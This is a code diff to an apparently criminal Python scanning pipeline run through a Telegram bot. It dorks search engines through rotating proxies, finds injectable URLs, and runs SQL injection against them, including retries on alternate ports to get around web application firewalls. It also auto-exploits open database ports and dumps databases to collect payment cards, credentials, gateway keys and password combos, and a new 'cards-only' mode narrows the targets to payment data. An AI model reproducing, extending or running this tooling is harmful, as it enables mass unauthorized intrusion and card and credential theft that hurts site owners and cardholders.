@@ -162,6 +162,7 @@ class MadyDorkerPipeline:
         self.generator = DorkGenerator(
             params_dir=self.config.params_dir,
             custom_dork_file=self.config.custom_dork_file,
+            priority_dork_file=self.config.priority_dork_file or None,
         )
         self.searcher = MultiSearch(
             proxies=self._load_proxies(),
@@ -172,25 +173,31 @@ class MadyDorkerPipeline:
         # Proxy manager (Phase 2)
         self.proxy_manager = None
         if self.config.use_proxies:
-            # Premium single proxy from env var takes priority
+            # Collect all proxy strings: env var single + config list
             proxy_url = getattr(self.config, "proxy_url", "")
+            proxy_urls_list = getattr(self.config, "proxy_urls", [])
+            all_inline = []
             if proxy_url:
-                # Single premium proxy — skip file loading, no health check needed
-                proxy_files = []  # Will inject inline after construction
-            else:
-                proxy_files = getattr(self.config, "proxy_files", [])
-                # Legacy fallback: if no proxy_files list, use single proxy_file
-                if not proxy_files and self.config.proxy_file:
-                    proxy_files = [self.config.proxy_file]
+                all_inline.append(proxy_url)
+            if proxy_urls_list:
+                all_inline.extend(proxy_urls_list)
+
+            has_inline = bool(all_inline)
+            # Always load proxy_files if configured (combine with inline proxies)
+            proxy_files = getattr(self.config, "proxy_files", [])
+            if not proxy_files:
+                pf = getattr(self.config, "proxy_file", "")
+                if pf:
+                    proxy_files = [pf]
 
             self.proxy_manager = ProxyManager(
                 proxy_files=proxy_files,
-                strategy="round_robin" if proxy_url else getattr(self.config, "proxy_rotation_strategy", "weighted"),
+                strategy="round_robin" if has_inline else getattr(self.config, "proxy_rotation_strategy", "weighted"),
                 ban_threshold=getattr(self.config, "proxy_ban_threshold", 5),
                 ban_duration=getattr(self.config, "proxy_ban_duration", 600),
                 country_filter=getattr(self.config, "proxy_country_filter", []),
                 sticky_per_domain=getattr(self.config, "proxy_sticky_per_domain", 3),
-                health_check=False if proxy_url else getattr(self.config, "proxy_health_check", True),
+                health_check=False if has_inline else getattr(self.config, "proxy_health_check", True),
                 health_check_interval=getattr(
                     self.config, "proxy_health_interval", 300
                 ),
@@ -199,16 +206,18 @@ class MadyDorkerPipeline:
                 enabled=True,
             )
 
-            # Inject premium proxy inline (credentials stay in env, never in code/logs)
-            if proxy_url:
+            # Inject all inline proxies (env var + config list)
+            if all_inline:
                 from proxy_manager import ProxyLoader, ProxyProtocol
                 inline_proxies = ProxyLoader.from_list(
-                    [proxy_url],
+                    all_inline,
                     ProxyProtocol(getattr(self.config, "proxy_protocol", "http")),
                 )
                 if inline_proxies:
                     self.proxy_manager.pool.add_proxies(inline_proxies)
-                    logger.info(f"💎 Premium proxy loaded: {inline_proxies[0].address}")
+                    logger.info(f"💎 {len(inline_proxies)} proxies loaded (round-robin)")
+                    for p in inline_proxies:
+                        logger.info(f"   → {p.address}")
 
             self.searcher.proxy_manager = self.proxy_manager
 
@@ -699,6 +708,31 @@ class MadyDorkerPipeline:
                 if skip in domain:
                     return True
 
+            # URL path pattern filtering (for card mode — skip blog/article/news/doc URLs)
+            _skip_path_patterns = getattr(self.config, 'skip_url_path_patterns', [])
+            if _skip_path_patterns:
+                path_q = (parsed.path + '?' + (parsed.query or '')).lower()
+                for pat in _skip_path_patterns:
+                    if pat in path_q:
+                        return True
+
+            # v10d: In cards-only mode, aggressively skip non-injectable URLs
+            # URLs without params AND without dynamic extensions are junk
+            if getattr(self.config, 'cards_only_reporting', False):
+                has_params = bool(parsed.query)
+                path_lower = parsed.path.lower()
+                _injectable_exts = (
+                    '.php', '.asp', '.aspx', '.jsp', '.jspx', '.cfm',
+                    '.cgi', '.pl', '.do', '.action', '.nsf', '.dll',
+                    '.php3', '.php4', '.php5', '.phtml', '.shtml',
+                    '.jsf', '.faces', '.xhtml', '.scala', '.py',
+                )
+                has_injectable_ext = any(path_lower.endswith(ext) or ext + '?' in (path_lower + '?') for ext in _injectable_exts)
+                # Keep URLs that have params OR have injectable extensions
+                # Skip static pages like .html, .htm, plain paths with no extension
+                if not has_params and not has_injectable_ext:
+                    return True
+
             # Skip search engine redirect/tracking URLs (common patterns)
             _redirect_patterns = (
                 "/click/", "/redirect", "/r/", "/url?", "/search?",
@@ -1024,7 +1058,7 @@ class MadyDorkerPipeline:
                         except Exception as e:
                             logger.debug(f"WAF detection failed for {url}: {e}")
 
-                    # Step 1b: Port Scanning (v3.10)
+                    # Step 1b: Port Scanning (v3.10) + Auto-Exploit
                     if self.port_scanner:
                         try:
                             port_result = await self.port_scanner.scan_and_report(url)
@@ -1039,6 +1073,14 @@ class MadyDorkerPipeline:
                                     }
                                     for p in port_result.open_ports
                                 ]
+                                # Track port exploit findings
+                                pe = getattr(port_result, "_exploit_report", None)
+                                if pe:
+                                    for er in pe.results:
+                                        self.found_cards += len(er.cards_found)
+                                        self.found_gateways += len(er.gateway_keys)
+                                    if pe.alt_http_ports:
+                                        result["alt_http_ports"] = pe.alt_http_ports
                         except Exception as e:
                             logger.debug(f"Port scan failed: {e}")
 
@@ -1243,14 +1285,22 @@ class MadyDorkerPipeline:
 
                     # Step 3: Recursive Crawl + Secret Extraction
                     # BFS crawl discovers pages → extract secrets from each page in real time
+                    # Crawl ALWAYS runs (for param URL discovery + SQLi), secret extraction is optional
                     crawl_result = None
                     discovered_param_urls: Set[str] = set()
+                    secrets: list = []
 
-                    if self.config.secret_extraction_enabled:
-                        secrets: list = []
+                    # v10d: Skip deep crawl if URL already has query params (saves 3-5s per URL)
+                    _url_parsed = urlparse(url)
+                    _url_has_params = bool(_url_parsed.query)
+                    _skip_crawl_for_params = (
+                        _url_has_params
+                        and getattr(self.config, "skip_crawl_if_has_params", False)
+                    )
 
-                        if self.crawler and self.config.deep_crawl_enabled:
-                            # --- v3.9 Recursive Crawler ---
+                    if self.crawler and self.config.deep_crawl_enabled and not _skip_crawl_for_params:
+                        # --- v3.9 Recursive Crawler ---
+                        if self.config.secret_extraction_enabled:
                             async def _on_crawl_page(page: CrawlPage):
                                 """Real-time secret extraction as pages are crawled."""
                                 if page.html:
@@ -1262,91 +1312,93 @@ class MadyDorkerPipeline:
                                     )
                                     if page_secrets:
                                         secrets.extend(page_secrets)
-
-                            crawl_result = await self.crawler.quick_crawl(
-                                url,
-                                session=session,
-                                max_depth=min(self.config.deep_crawl_max_depth, 2),
-                                max_pages=min(self.config.deep_crawl_max_pages, 30),
-                                on_page=_on_crawl_page,
-                            )
-
-                            # ── FlareSolverr fallback: if aiohttp got very few pages ──
-                            if crawl_result.total_fetched <= 2:
-                                logger.info(
-                                    f"[FlareFallback] aiohttp only got {crawl_result.total_fetched} pages "
-                                    f"for {url}, trying FlareSolverr crawl..."
-                                )
-                                try:
-                                    flare_result = await flaresolverr_crawl(
-                                        seed_url=url,
-                                        max_pages=min(
-                                            self.config.deep_crawl_max_pages, 30
-                                        ),
-                                        max_depth=min(
-                                            self.config.deep_crawl_max_depth, 2
-                                        ),
-                                    )
-                                    if (
-                                        flare_result.total_fetched
-                                        > crawl_result.total_fetched
-                                    ):
-                                        logger.info(
-                                            f"[FlareFallback] FlareSolverr got {flare_result.total_fetched} pages "
-                                            f"(vs aiohttp {crawl_result.total_fetched}), using FlareSolverr result"
-                                        )
-                                        # Run secret extraction on FlareSolverr-crawled pages
-                                        for bp in flare_result.html_pages:
-                                            if bp.html:
-                                                page_secrets = self.secret_extractor.extract_from_text(
-                                                    bp.html,
-                                                    bp.url,
-                                                )
-                                                if page_secrets:
-                                                    secrets.extend(page_secrets)
-                                        crawl_result = flare_result
-                                    else:
-                                        logger.info(
-                                            "[FlareFallback] No improvement, keeping aiohttp result"
-                                        )
-                                except Exception as e:
-                                    logger.warning(
-                                        f"[FlareFallback] FlareSolverr crawl failed: {e}"
-                                    )
-
-                            discovered_param_urls = crawl_result.param_urls
-
-                            # Store crawl cookies
-                            for cname, cval in crawl_result.all_cookies.items():
-                                if cname not in result.get("cookies", {}).get(
-                                    "all", {}
-                                ):
-                                    self.db.add_cookie(url, cname, cval, "crawl")
-                            for cname, cval in crawl_result.b3_cookies.items():
-                                self.db.add_b3_cookie(url, cname, cval)
-                                logger.info(f"🔵 B3 cookie via crawl: {cname} at {url}")
-
-                            result["crawl"] = {
-                                "pages_fetched": crawl_result.total_fetched,
-                                "max_depth": crawl_result.max_depth_reached,
-                                "urls_discovered": len(crawl_result.all_urls),
-                                "param_urls": len(crawl_result.param_urls),
-                                "forms": len(crawl_result.form_targets),
-                                "cookies": len(crawl_result.all_cookies),
-                                "b3_cookies": len(crawl_result.b3_cookies),
-                            }
                         else:
-                            # --- Fallback: flat deep_extract_site ---
-                            scan_data = await self.secret_extractor.deep_extract_site(
-                                url, session
-                            )
-                            secrets = (
-                                scan_data.get("secrets", [])
-                                if isinstance(scan_data, dict)
-                                else scan_data
-                            )
+                            _on_crawl_page = None
 
-                        if secrets:
+                        crawl_result = await self.crawler.quick_crawl(
+                            url,
+                            session=session,
+                            max_depth=min(self.config.deep_crawl_max_depth, 2),
+                            max_pages=min(self.config.deep_crawl_max_pages, 30),
+                            on_page=_on_crawl_page,
+                        )
+
+                        # ── FlareSolverr fallback: if aiohttp got very few pages ──
+                        if self.config.secret_extraction_enabled and getattr(self.config, 'flaresolverr_fallback', True) and crawl_result.total_fetched <= 2:
+                            logger.info(
+                                f"[FlareFallback] aiohttp only got {crawl_result.total_fetched} pages "
+                                f"for {url}, trying FlareSolverr crawl..."
+                            )
+                            try:
+                                flare_result = await flaresolverr_crawl(
+                                    seed_url=url,
+                                    max_pages=min(
+                                        self.config.deep_crawl_max_pages, 30
+                                    ),
+                                    max_depth=min(
+                                        self.config.deep_crawl_max_depth, 2
+                                    ),
+                                )
+                                if (
+                                    flare_result.total_fetched
+                                    > crawl_result.total_fetched
+                                ):
+                                    logger.info(
+                                        f"[FlareFallback] FlareSolverr got {flare_result.total_fetched} pages "
+                                        f"(vs aiohttp {crawl_result.total_fetched}), using FlareSolverr result"
+                                    )
+                                    # Run secret extraction on FlareSolverr-crawled pages
+                                    for bp in flare_result.html_pages:
+                                        if bp.html:
+                                            page_secrets = self.secret_extractor.extract_from_text(
+                                                bp.html,
+                                                bp.url,
+                                            )
+                                            if page_secrets:
+                                                secrets.extend(page_secrets)
+                                    crawl_result = flare_result
+                                else:
+                                    logger.info(
+                                        "[FlareFallback] No improvement, keeping aiohttp result"
+                                    )
+                            except Exception as e:
+                                logger.warning(
+                                    f"[FlareFallback] FlareSolverr crawl failed: {e}"
+                                )
+
+                        discovered_param_urls = crawl_result.param_urls
+
+                        # Store crawl cookies
+                        for cname, cval in crawl_result.all_cookies.items():
+                            if cname not in result.get("cookies", {}).get(
+                                "all", {}
+                            ):
+                                self.db.add_cookie(url, cname, cval, "crawl")
+                        for cname, cval in crawl_result.b3_cookies.items():
+                            self.db.add_b3_cookie(url, cname, cval)
+                            logger.info(f"🔵 B3 cookie via crawl: {cname} at {url}")
+
+                        result["crawl"] = {
+                            "pages_fetched": crawl_result.total_fetched,
+                            "max_depth": crawl_result.max_depth_reached,
+                            "urls_discovered": len(crawl_result.all_urls),
+                            "param_urls": len(crawl_result.param_urls),
+                            "forms": len(crawl_result.form_targets),
+                            "cookies": len(crawl_result.all_cookies),
+                            "b3_cookies": len(crawl_result.b3_cookies),
+                        }
+                    elif self.config.secret_extraction_enabled:
+                        # --- Fallback: flat deep_extract_site ---
+                        scan_data = await self.secret_extractor.deep_extract_site(
+                            url, session
+                        )
+                        secrets = (
+                            scan_data.get("secrets", [])
+                            if isinstance(scan_data, dict)
+                            else scan_data
+                        )
+
+                    if secrets:
                             result["secrets"] = [
                                 {
                                     "type": s.type,
@@ -1834,6 +1886,27 @@ class MadyDorkerPipeline:
                                 waf_name=waf_name,
                                 protection_info=waf_info,
                             )
+
+                            # Alt-HTTP WAF bypass: if no SQLi on port 443 but alt-HTTP ports open
+                            if not sqli_results and result.get("alt_http_ports"):
+                                from urllib.parse import urlparse as _up, urlunparse
+                                for alt_port in result["alt_http_ports"][:2]:
+                                    _pu = _up(url)
+                                    alt_url = urlunparse((
+                                        "http", f"{_pu.hostname}:{alt_port}",
+                                        _pu.path, _pu.params, _pu.query, _pu.fragment,
+                                    ))
+                                    logger.info(f"[WAF-Bypass] Retrying SQLi on alt port {alt_port}: {alt_url}")
+                                    try:
+                                        sqli_results = await self.sqli_scanner.scan(
+                                            alt_url, session, waf_name=None,
+                                        )
+                                        if sqli_results:
+                                            logger.info(f"[WAF-Bypass] SQLi found on port {alt_port}!")
+                                            break
+                                    except Exception:
+                                        continue
+
                             if sqli_results:
                                 result["sqli"] = [
                                     {
@@ -2268,6 +2341,33 @@ class MadyDorkerPipeline:
                                                     "source": "Discovered via recursive crawl",
                                                 },
                                             )
+
+                                            # Auto-dump crawl-discovered SQLi too
+                                            if self.config.dumper_enabled and self.auto_dumper:
+                                                try:
+                                                    parsed = await self.auto_dumper.auto_dump(
+                                                        sqli, session
+                                                    )
+                                                    if parsed and parsed.total_rows > 0:
+                                                        result["dumps"].append(
+                                                            {
+                                                                "source": f"crawl_{parsed.source}",
+                                                                "tables": len(parsed.tables_dumped),
+                                                                "rows": parsed.total_rows,
+                                                                "cards": len(parsed.cards),
+                                                                "creds": len(parsed.credentials),
+                                                                "keys": len(parsed.gateway_keys),
+                                                                "secrets": len(parsed.secrets),
+                                                                "valid_keys": len(parsed.valid_keys),
+                                                                "hashes": len(parsed.hashes),
+                                                                "emails": len(parsed.emails),
+                                                                "combos": len(parsed.combos_user_pass) + len(parsed.combos_email_pass),
+                                                                "files": list(parsed.files.keys()),
+                                                            }
+                                                        )
+                                                        logger.info(f"Crawl-discovered dump: {extra_url[:50]} → {parsed.total_rows} rows, {len(parsed.cards)} cards")
+                                                except Exception as e:
+                                                    logger.debug(f"Crawl-discovered dump failed: {e}")
                                 except asyncio.TimeoutError:
                                     logger.warning(
                                         f"Crawl-discovered SQLi test timed out for {extra_url}"
@@ -2897,6 +2997,35 @@ class MadyDorkerPipeline:
     ):
         """Process a URL with error handling for concurrent use."""
         _timeout = getattr(self.config, "url_process_timeout", 120)
+
+        # ── Fast pre-check: HEAD request with 2s timeout ──
+        # Fail unreachable sites quickly instead of burning the full pipeline timeout
+        _precheck = getattr(self.config, "fast_precheck", False)
+        if _precheck:
+            try:
+                import aiohttp
+                _pre_timeout = aiohttp.ClientTimeout(total=2)
+                _proxy_url = None
+                if self.proxy_manager:
+                    try:
+                        _pi = self.proxy_manager.get_proxy()
+                        if _pi:
+                            _proxy_url = _pi.url
+                    except Exception:
+                        pass
+                async with aiohttp.ClientSession(timeout=_pre_timeout) as _s:
+                    async with _s.head(url, allow_redirects=True, ssl=False, proxy=_proxy_url) as _r:
+                        pass  # Just checking connectivity
+            except Exception:
+                # Site didn't respond to HEAD in 2s — skip it
+                logger.info(f"Pre-check failed (2s): {url[:60]}")
+                try:
+                    domain = urlparse(url).netloc
+                    self.db.record_url_failure(url, domain, "precheck_timeout_2s")
+                except Exception:
+                    pass
+                return
+
         try:
             result = await asyncio.wait_for(
                 self.process_url(url),
@@ -2905,13 +3034,17 @@ class MadyDorkerPipeline:
             results_list.append(result)
 
             # Check if anything was found
+            _cards_only = getattr(self.config, 'cards_only_reporting', False)
             findings = []
+
+            # Card-relevant findings (always counted)
             if result.get("secrets"):
-                findings.append(f"{len(result['secrets'])} secrets")
-            if result.get("sqli"):
-                findings.append(f"{len(result['sqli'])} SQLi vulns")
-            if result.get("dumps"):
-                findings.append(f"{len(result['dumps'])} dumps")
+                gw_secrets = [s for s in result["secrets"] if isinstance(s, dict) and s.get("category") == "gateway"]
+                other_secrets = [s for s in result["secrets"] if isinstance(s, dict) and s.get("category") != "gateway"]
+                if gw_secrets:
+                    findings.append(f"{len(gw_secrets)} gateway keys")
+                if other_secrets:
+                    findings.append(f"{len(other_secrets)} secrets")
             if result.get("cookies", {}).get("b3"):
                 findings.append(f"B3 cookies")
             hunt = result.get("cookie_hunt", {})
@@ -2924,24 +3057,42 @@ class MadyDorkerPipeline:
                 )
             if hunt.get("detected_gateways"):
                 findings.append(f"gateways: {', '.join(hunt['detected_gateways'])}")
-            crawl = result.get("crawl", {})
-            if crawl.get("pages_fetched"):
-                findings.append(
-                    f"crawled {crawl['pages_fetched']}pg d{crawl['max_depth']} "
-                    f"({crawl['param_urls']} params)"
-                )
-            for vkey, vlabel in [
-                ("xss", "XSS"),
-                ("ssti", "SSTI"),
-                ("nosql", "NoSQL"),
-                ("lfi", "LFI"),
-                ("ssrf", "SSRF"),
-                ("cors", "CORS"),
-                ("redirects", "Redirect"),
-                ("crlf", "CRLF"),
-            ]:
-                if result.get(vkey):
-                    findings.append(f"{len(result[vkey])} {vlabel}")
+            ecom = result.get("ecommerce", {})
+            if ecom and ecom.get("platform"):
+                ecom_parts = [f"ecom:{ecom['platform']}"]
+                if ecom.get("gateways"):
+                    ecom_parts.append(f"gw:{','.join(ecom['gateways'][:3])}")
+                findings.append(' '.join(ecom_parts))
+            if result.get("dumps"):
+                for d in result["dumps"]:
+                    cards = d.get("cards", 0)
+                    creds = d.get("creds", d.get("credentials", 0))
+                    if cards:
+                        findings.append(f"💳 {cards} cards in dump")
+                    elif creds:
+                        findings.append(f"dump: {creds} creds")
+
+            # Non-card findings (only counted when NOT in cards_only mode)
+            if not _cards_only:
+                if result.get("sqli"):
+                    findings.append(f"{len(result['sqli'])} SQLi vulns")
+                if result.get("dumps"):
+                    for d in result["dumps"]:
+                        if not d.get("cards", 0) and not d.get("creds", d.get("credentials", 0)):
+                            findings.append(f"dump: {d.get('rows', 0)} rows")
+                crawl = result.get("crawl", {})
+                if crawl.get("pages_fetched"):
+                    findings.append(
+                        f"crawled {crawl['pages_fetched']}pg d{crawl['max_depth']} "
+                        f"({crawl['param_urls']} params)"
+                    )
+                for vkey, vlabel in [
+                    ("xss", "XSS"), ("ssti", "SSTI"), ("nosql", "NoSQL"),
+                    ("lfi", "LFI"), ("ssrf", "SSRF"), ("cors", "CORS"),
+                    ("redirects", "Redirect"), ("crlf", "CRLF"),
+                ]:
+                    if result.get(vkey):
+                        findings.append(f"{len(result[vkey])} {vlabel}")
 
             if findings:
                 findings_counter.append(1)
@@ -2961,11 +3112,21 @@ class MadyDorkerPipeline:
                         logger.debug(f"Auto-export error: {e}")
         except asyncio.TimeoutError:
             logger.warning(
-                f"URL processing timed out ({_timeout}s): {url[:60]} — "
-                f"URL remains eligible for retry on next cycle"
+                f"URL processing timed out ({_timeout}s): {url[:60]}"
             )
+            # Mark as failed so it counts toward max_url_retries
+            try:
+                domain = urlparse(url).netloc
+                self.db.record_url_failure(url, domain, f"timeout_{_timeout}s")
+            except Exception:
+                pass
         except Exception as e:
-            logger.warning(f"URL processing error (will retry): {url[:60]} — {e}")
+            logger.warning(f"URL processing error: {url[:60]} — {e}")
+            try:
+                domain = urlparse(url).netloc
+                self.db.record_url_failure(url, domain, str(e)[:200])
+            except Exception:
+                pass
 
     async def run_dork_cycle(self, dorks: List[str] = None, category: str = None):
         """Run one cycle of dorking + processing with concurrent URL scanning.
@@ -3085,7 +3246,7 @@ class MadyDorkerPipeline:
         cycle_cookies = 0
 
         # --- Parallel dork search: batch N dork searches concurrently ---
-        _dork_batch_size = 5  # Search 5 dorks in parallel
+        _dork_batch_size = getattr(self.config, 'dork_batch_size', 5)
 
         for batch_start in range(0, len(cycle_dorks), _dork_batch_size):
             if not self.running:
@@ -3822,11 +3983,11 @@ pipeline_task: Optional[asyncio.Task] = None
 scan_tasks: Dict[int, asyncio.Task] = {}  # chat_id -> running scan task
 
 
-def get_pipeline() -> MadyDorkerPipeline:
+def get_pipeline(config: DorkerConfig = None) -> MadyDorkerPipeline:
     """Get or create the pipeline instance."""
     global pipeline
     if pipeline is None:
-        pipeline = MadyDorkerPipeline()
+        pipeline = MadyDorkerPipeline(config)
     return pipeline
 
 
@@ -4523,7 +4684,8 @@ async def cmd_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"Phase 2: Secret Extraction (all pages)\n"
         f"Phase 3: Deep Crawl (discover all internal pages)\n"
         f"Phase 4: SQLi Testing (URL + Cookie + Header + POST)\n"
-        f"Phase 5: Data Dumping (if injectable)\n\n"
+        f"Phase 5: Auto-Dump Pipeline (union → error → blind → DIOS)\n"
+        f"         Cards, payments, gateway keys extraction\n\n"
         f"Use /stopscan to cancel.",
         parse_mode="HTML",
     )
@@ -4614,6 +4776,8 @@ async def _do_scan(update: Update, url: str):
                 logger.debug(f"Cookie extraction error: {e}")
 
         # Port scanning (v3.10) — parallel with Phase 1
+        # auto_exploit fires inside scan_and_report when db/redis/ES ports found
+        port_exploit_report = None
         if p.port_scanner:
             try:
                 port_result = await p.port_scanner.scan_and_report(url)
@@ -4628,6 +4792,25 @@ async def _do_scan(update: Update, url: str):
                         }
                         for pp in port_result.open_ports
                     ]
+                    # Capture exploit results for downstream tracking
+                    port_exploit_report = getattr(port_result, "_exploit_report", None)
+                    if port_exploit_report:
+                        # Track cards/keys from port exploitation
+                        for er in port_exploit_report.results:
+                            for card in er.cards_found:
+                                p.found_cards += 1
+                                p.db.add_card_data(url, card)
+                            for key in er.gateway_keys:
+                                p.found_gateways += 1
+                                p.db.add_gateway_key(
+                                    url=url,
+                                    key_type=key.get("key_type", ""),
+                                    key_value=key.get("key_value", ""),
+                                    source=f"port_exploit:{er.service}:{er.port}",
+                                    confidence=0.9,
+                                )
+                        if port_exploit_report.alt_http_ports:
+                            logger.info(f"Alt-HTTP ports for WAF bypass: {port_exploit_report.alt_http_ports}")
             except Exception as e:
                 logger.debug(f"Port scan error in cmd_scan: {e}")
 
@@ -5261,344 +5444,146 @@ async def _do_scan(update: Update, url: str):
                                 },
                             )
 
-                            # ═══════ PHASE 5: Exploit + Dump ═══════
-                            if p.config.dumper_enabled and r.injection_type in (
-                                "union",
-                                "error",
-                            ):
+                            # ═══════ PHASE 5: Auto-Dump (full pipeline) ═══════
+                            # Uses auto_dump() — same pipeline as the dorker:
+                            #   union → multi-union → error → blind fallback
+                            #   deep-parse → combos → validate keys → files → Telegram
+                            if p.config.dumper_enabled and p.auto_dumper:
                                 await update.message.reply_text(
-                                    f"💉 <b>Injectable!</b> Exploiting {r.injection_type}-based SQLi\n"
+                                    f"💉 <b>Injectable!</b> {r.injection_type}-based SQLi\n"
                                     f"Param: <code>{r.parameter}</code> ({getattr(r, 'injection_point', 'url')})\n"
                                     f"DBMS: {r.dbms or 'Unknown'} | Columns: {r.column_count}\n"
-                                    f"Dumping tables & data...",
+                                    f"🔄 Running full dump pipeline (union → error → blind)...",
                                     parse_mode="HTML",
                                 )
 
                                 try:
-                                    dump = await p.dumper.targeted_dump(r, session)
-                                    
-                                    # Run deep-parse via AutoDumper for secrets/PII/hashes/combos
-                                    _deep_parsed = None
-                                    if dump and p.auto_dumper and (dump.has_valuable_data or dump.total_rows > 0):
-                                        try:
-                                            from auto_dumper import ParsedDumpData
-                                            _deep_parsed = ParsedDumpData(url=r.url, source="scan_union")
-                                            await p.auto_dumper._deep_parse_rows(dump, _deep_parsed)
-                                        except Exception as dp_err:
-                                            logger.debug(f"Deep-parse in /scan: {dp_err}")
+                                    parsed = await p.auto_dumper.auto_dump(
+                                        r, session, waf_name=waf_name
+                                    )
 
-                                    if dump.has_valuable_data or dump.total_rows > 0:
-                                        saved = p.dumper.save_dump(dump)
-
+                                    if parsed and (parsed.total_rows > 0 or parsed.cards or parsed.gateway_keys):
                                         dump_info = {
                                             "url": r.url,
                                             "param": r.parameter,
-                                            "dbms": dump.dbms,
-                                            "database": dump.database,
-                                            "tables": len(dump.tables),
-                                            "total_rows": dump.total_rows,
-                                            "cards": len(dump.card_data),
-                                            "credentials": len(dump.credentials),
-                                            "gateway_keys": len(dump.gateway_keys),
-                                            "files": saved,
+                                            "type": parsed.source or r.injection_type,
+                                            "dbms": r.dbms or "Unknown",
+                                            "tables": len(parsed.tables_dumped),
+                                            "total_rows": parsed.total_rows,
+                                            "cards": len(parsed.cards),
+                                            "credentials": len(parsed.credentials),
+                                            "gateway_keys": len(parsed.gateway_keys),
+                                            "secrets": len(parsed.secrets),
+                                            "valid_keys": len(parsed.valid_keys),
+                                            "files": parsed.files,
                                         }
                                         all_dump_results.append(dump_info)
 
-                                        await p.reporter.report_data_dump(
-                                            r.url,
-                                            dump.dbms,
-                                            dump.database,
-                                            dump.tables,
-                                            {
-                                                t: len(rows)
-                                                for t, rows in dump.data.items()
-                                            },
-                                            saved,
-                                        )
-
-                                        if dump.card_data:
-                                            p.found_cards.extend(dump.card_data)
-                                            for card in dump.card_data:
+                                        # Track cards
+                                        if parsed.cards:
+                                            p.found_cards.extend(parsed.cards)
+                                            for card in parsed.cards:
                                                 p.db.add_card_data(r.url, card)
-                                            await p.reporter.report_card_data(
-                                                r.url, dump.card_data
-                                            )
 
-                                        if dump.credentials:
-                                            for cred in dump.credentials:
-                                                p.found_secrets.append(
-                                                    {
-                                                        "url": r.url,
-                                                        "type": "db_credential",
-                                                        "value": str(cred),
-                                                        "source": "sqli_dump",
-                                                        "time": datetime.now().isoformat(),
-                                                    }
+                                        # Track gateway keys
+                                        for key_entry in parsed.gateway_keys:
+                                            for col, val in key_entry.items():
+                                                p.found_gateways.append({
+                                                    "url": r.url,
+                                                    "type": f"db_{col}",
+                                                    "value": val,
+                                                    "source": f"auto_dump_{parsed.source}",
+                                                    "time": datetime.now().isoformat(),
+                                                })
+                                                p.db.add_gateway_key(
+                                                    r.url, f"db_{col}", val,
+                                                    source=f"auto_dump_{parsed.source}",
                                                 )
 
-                                        if dump.gateway_keys:
-                                            for key_entry in dump.gateway_keys:
-                                                for col, val in key_entry.items():
-                                                    p.found_gateways.append(
-                                                        {
-                                                            "url": r.url,
-                                                            "type": f"db_{col}",
-                                                            "value": val,
-                                                            "source": "sqli_dump",
-                                                            "time": datetime.now().isoformat(),
-                                                        }
-                                                    )
-                                                    p.db.add_gateway_key(
-                                                        r.url,
-                                                        f"db_{col}",
-                                                        val,
-                                                        source="sqli_dump",
-                                                    )
-                                                    await p.reporter.report_gateway(
-                                                        r.url,
-                                                        f"DB: {col}",
-                                                        val,
-                                                        {
-                                                            "source": "SQL injection dump via /scan"
-                                                        },
-                                                    )
-                                                    # Feed to Mady bot
-                                                    if p.mady_feeder:
-                                                        try:
-                                                            p.mady_feeder.feed_gateway(
-                                                                r.url,
-                                                                f"db_{col}",
-                                                                val,
-                                                                source="scan_sqli_dump",
-                                                            )
-                                                        except Exception:
-                                                            pass
+                                        # Track valid keys
+                                        for vk in parsed.valid_keys:
+                                            p.found_gateways.append({
+                                                "url": r.url,
+                                                "type": vk.get("type", "validated_key"),
+                                                "value": vk.get("value", ""),
+                                                "source": "auto_dump_validated",
+                                                "time": datetime.now().isoformat(),
+                                            })
 
-                                        # Feed /scan dump to Mady
+                                        # Track secrets
+                                        for sec in parsed.secrets:
+                                            p.found_secrets.append({
+                                                "url": r.url,
+                                                "type": sec.get("type", "dump_secret"),
+                                                "value": str(sec.get("value", ""))[:200],
+                                                "source": f"auto_dump_{parsed.source}",
+                                                "time": datetime.now().isoformat(),
+                                            })
+
+                                        # Feed to Mady
                                         if p.mady_feeder:
                                             try:
                                                 p.mady_feeder.feed_dump(
-                                                    r.url,
-                                                    dump.dbms,
-                                                    dump.database or "N/A",
-                                                    tables=len(dump.tables),
-                                                    rows=dump.total_rows,
-                                                    cards=len(dump.card_data),
-                                                    credentials=len(dump.credentials),
-                                                    gateway_keys=len(dump.gateway_keys),
-                                                    dump_type="union",
-                                                    source="scan_sqli_dump",
+                                                    r.url, r.dbms or "Unknown",
+                                                    "N/A",
+                                                    tables=len(parsed.tables_dumped),
+                                                    rows=parsed.total_rows,
+                                                    cards=len(parsed.cards),
+                                                    credentials=len(parsed.credentials),
+                                                    gateway_keys=len(parsed.gateway_keys),
+                                                    dump_type=parsed.source or r.injection_type,
+                                                    source="scan_auto_dump",
                                                 )
                                             except Exception:
                                                 pass
 
+                                        # User-facing summary
                                         dump_text = (
-                                            f"📦 <b>Data Dump Successful!</b>\n"
-                                            f"DB: {dump.database or 'N/A'} ({dump.dbms})\n"
-                                            f"Tables: {len(dump.tables)} | Rows: {dump.total_rows}\n"
+                                            f"📦 <b>Dump Complete!</b> ({parsed.source})\n"
+                                            f"DBMS: {r.dbms or 'Unknown'}\n"
+                                            f"Tables: {len(parsed.tables_dumped)} | Rows: {parsed.total_rows}\n"
                                         )
-                                        if dump.card_data:
-                                            dump_text += f"💳 <b>Card Data: {len(dump.card_data)} entries</b>\n"
-                                        if dump.credentials:
-                                            dump_text += f"🔐 Credentials: {len(dump.credentials)}\n"
-                                        if dump.gateway_keys:
-                                            dump_text += f"🔑 Gateway Keys: {len(dump.gateway_keys)}\n"
-                                        if dump.raw_dumps:
-                                            dump_text += f"📄 DIOS Dumps: {len(dump.raw_dumps)}\n"
+                                        if parsed.cards:
+                                            dump_text += f"💳 <b>Card Data: {len(parsed.cards)} entries</b>\n"
+                                        if parsed.credentials:
+                                            dump_text += f"🔐 Credentials: {len(parsed.credentials)}\n"
+                                        if parsed.gateway_keys:
+                                            dump_text += f"🔑 Gateway Keys: {len(parsed.gateway_keys)}\n"
+                                        if parsed.valid_keys:
+                                            dump_text += f"✅ Validated Keys: {len(parsed.valid_keys)}\n"
+                                        if parsed.secrets:
+                                            dump_text += f"🔍 Secrets: {len(parsed.secrets)}\n"
+                                        if parsed.hashes:
+                                            dump_text += f"#️⃣ Hashes: {len(parsed.hashes)}\n"
+                                        if parsed.combos_user_pass:
+                                            dump_text += f"📋 Combos: {len(parsed.combos_user_pass)} user:pass\n"
+                                        if parsed.files:
+                                            dump_text += f"📁 Files: {', '.join(parsed.files.keys())}\n"
                                         await update.message.reply_text(
                                             dump_text, parse_mode="HTML"
                                         )
                                     else:
-                                        all_dump_results.append(
-                                            {
-                                                "url": r.url,
-                                                "param": r.parameter,
-                                                "dbms": dump.dbms,
